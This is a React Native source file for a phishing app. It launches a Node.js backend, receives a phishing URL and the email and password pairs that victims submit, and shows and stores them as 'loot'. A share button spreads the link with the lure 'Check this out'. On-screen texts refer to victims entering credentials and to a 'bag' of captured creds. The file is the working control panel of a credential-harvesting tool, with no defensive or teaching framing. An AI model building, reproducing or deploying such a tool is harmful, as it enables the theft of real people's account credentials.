 import React, { Component } from 'react';
 import {
   StyleSheet,
   Text,
   View,
   ScrollView,
   TouchableOpacity,
   Linking,
   Modal,
   TouchableWithoutFeedback,
   FlatList,
   Share
 } from 'react-native';
 import nodejs from 'nodejs-mobile-react-native';
 import moment from 'moment';
 import Icon from 'react-native-vector-icons/MaterialCommunityIcons'

 import storage from './src/util/storage.service';
 
 export default class App extends Component{
   constructor(props){
     super(props);
     this.state = { 
       lastNodeMessage: "Offline  ",
       currentState:"false",
       userData:[],
       url:null,
       cacheData:[],
       visible:false
       };
     this.listenerRef = null;
     this._asyncStorage = new storage();
   }
   componentDidMount()
   {
     nodejs.start('main.js');
     this.listenerRef = ((msg) => {
       if (typeof msg === "object"){
        this.state.userData.push(msg)
        let Day = moment().utcOffset('+05:30')
        this._addLoot({
          "timeID": Day,
          "cred":msg});
       }else{
         var tmp =msg.substr(0,3);
         if(tmp=="URL"){
           this.setState({url:msg.substr(3)})
         }else{
           this.setState({lastNodeMessage: msg});
         }
       } 
     });
     nodejs.channel.addListener(
       "message",
       this.listenerRef,
       this 
     );
   }
   componentWillUnmount()
   {
     if (this.listenerRef) {
       nodejs.channel.removeListener("message", this.listenerRef);
     }
   }
   _handleStart=()=>{
    if(this.state.currentState){
      nodejs.channel.send('start')
      this.setState({currentState:false})
    }else{
      nodejs.channel.send('stop')
      this.setState({currentState:true,url:null,lastNodeMessage:"Offline"})
    }
   }
   async _addLoot(data) {
     let tmp=await this._getLoot()
     if(tmp){
      await this._asyncStorage._storeData('loot',[...tmp,data]);
     }else{
       await this._asyncStorage._storeData('loot',[data]); 
     }
    }

   async _getLoot() {
    const result=await this._asyncStorage._readData('loot');
    console.log(result)
    return result;
   }
   async _delLoot(id) {
    let tmp = await this._getLoot();
    if(tmp){
      tmp= tmp.filter((item) =>item.timeID != id)
      this.setState({cacheData:tmp})
      await this._asyncStorage._storeData('loot',tmp);
     }else{} 
   }
   async _openModel(){
    let tmp = await this._getLoot();
    if(tmp){
     this.setState({cacheData:tmp,visible:true})
     }else{
      this.setState({visible:true})
     } 
   }
   async shareUrl() {
    try {
        const result = await Share.share({
          message:'Check this out \n Link :- '+ this.state.url,
        });
        if (result.action === Share.sharedAction) {
          if (result.activityType) {
            // shared with activity type of result.activityType
          } else {
            // shared
          }
        } else if (result.action === Share.dismissedAction) {
          // dismissed
        }
      } catch (error) {
        //error
      }
     }


   render() {
     return (
       <>
       <View>
         <TouchableOpacity 
           onPress={()=>this._handleStart()}
           style={styles.btn}
         >
           <Text style={{color:"white"}}>{this.state.currentState?"Start":"Stop"}</Text>
         </TouchableOpacity>
         {/*status bar tile */}
         <View style={styles.statusBar}>
         <Text style={styles.statusText}>Status:</Text>
         <Text style={styles.statusText}>{this.state.lastNodeMessage}</Text>
         </View>
         {/*url bar tile */}
         {this.state.url?
         <View style={styles.urlBar}>
         <Text style={styles.statusText}>URL:</Text>
         <Text onPress={()=>Linking.openURL(`${this.state.url}`)} style={styles.urlText}>{this.state.url}</Text>
         <TouchableOpacity
         onPress={()=>this.shareUrl()}
         style={{marginRight:20,justifyContent:"center"}}
         >
         <Icon name={'share-circle'} size={25}/>
         </TouchableOpacity>
         </View>:<></>
          }
         {/*loot view  */} 
         <ScrollView style={styles.lootScrollView}>
         {this.state.userData.length>0?
         this.state.userData.map((data,index)=>(
        <View key={index} style={styles.credentialBox}>
        <Text style={{color:"#ed4956",marginLeft:10}}>Hit </Text>
        <Text style={{color:"#fff"}}>{" "+(index+1)+".  "}</Text>
        <Text style={{color:"#fff"}}>Email: {data.email+"\n"}Password: {data.password}</Text>
         </View>
         ))
         :
         <Text style={styles.lootText}>
          {"No Loot yet, once victim enter credentials, \nit will display here!!"}
         </Text>}
         </ScrollView>
        {/*<TouchableOpacity 
           onPress={()=>this._getLoot()}
           style={styles.btn}
         >
           <Text style={{color:"white"}}>{"get"}</Text>
         </TouchableOpacity>
         */}
       </View>

       <View style={{flex:1,justifyContent:"flex-end"}}>
       <TouchableOpacity
        onPress={()=>this._openModel()}
       style={{backgroundColor:"#0095f6",padding:18,flexDirection:"row",justifyContent:"center"}}
       >
         <Icon name={"hook"} size={20} color={"#fff"}/>
       <Text style={{color:"white",fontWeight:"bold",fontSize:18,paddingLeft:2}}>{"My Loot"}</Text>
       </TouchableOpacity>
       </View>

       <Modal 
       visible={this.state.visible}
       onRequestClose={()=>this.setState({visible:false})}    
       animationType="slide"
       transparent
       >
       <View style={{ height:200,width:"100%"}}>  
       <TouchableWithoutFeedback
       onPress={()=>this.setState({visible:false})}   
       >
        <View  style={{width:"100%",height:"100%"}}></View>
       </TouchableWithoutFeedback>
       </View>  
      
       <FlatList
               data={this.state.cacheData}
               keyExtractor={(item) => item.timeID.toString()}
               style={styles.list}
               ListHeaderComponent={<View style={{margin:10}}>
               <Text style={{textAlign:"center",fontWeight:"bold"}}>LOOT</Text>    
               {this.state.cacheData.length>0?<></>:<Text style={styles.lootText2}>
              {"No Loot yet, this is your bag \nit will store all captured creds here!!"}
               </Text>}    
               </View> 
              }
               renderItem={({item}) => (
                 <View style={{margin:10,marginRight:20,flexDirection:"row",justifyContent:"space-between",alignItems:"center"}}>
                   <Text style={{marginLeft:10}}>Email: {item.cred.email+"\n"}Password: {item.cred.password}</Text> 
                   <TouchableOpacity
                   onPress={()=>this._delLoot(item.timeID)}
                   >
                   <Icon name={"delete"} size={20} />     
                   </TouchableOpacity>
                   </View>
               )}
        ></FlatList>     
       </Modal>
       </>
     );
   }
 }
 
 const styles = StyleSheet.create({
   btn:{
   backgroundColor:"#0095f6",
   alignSelf:"flex-end",
   height:30,
   width:60,
   justifyContent:"center",
   alignItems:"center",
   marginRight:10,
   marginVertical:10,
   borderRadius:5
   },
   credentialBox:{
     flexDirection:"row",
     marginVertical:10,
   },
   list: {
    backgroundColor: "#fff",
    borderTopRightRadius:20,
    borderTopLeftRadius:20,
   },
   lootText: {
     marginTop:180,
     textAlign: 'center',
     color: '#fff',
     marginBottom: 5,
   },
   lootText2: {
    marginTop:180,
    textAlign: 'center',
    color: '#000',
    marginBottom: 5,
  },
   lootScrollView:{
   backgroundColor:"#000",
   height:400,
   },
   statusText:{
    color: '#333333',
    fontWeight:"bold",
    //fontFamily:'Bitwise'
   },
   statusBar:{
     margin:10,
     flexDirection:"row",
     justifyContent:"space-between",
   },
   urlBar:{
    margin:10,
    flexDirection:"row",
    justifyContent:"space-between"
  },
  urlText:{
    fontWeight:"900",
    color:"#0095f6"
  }
 });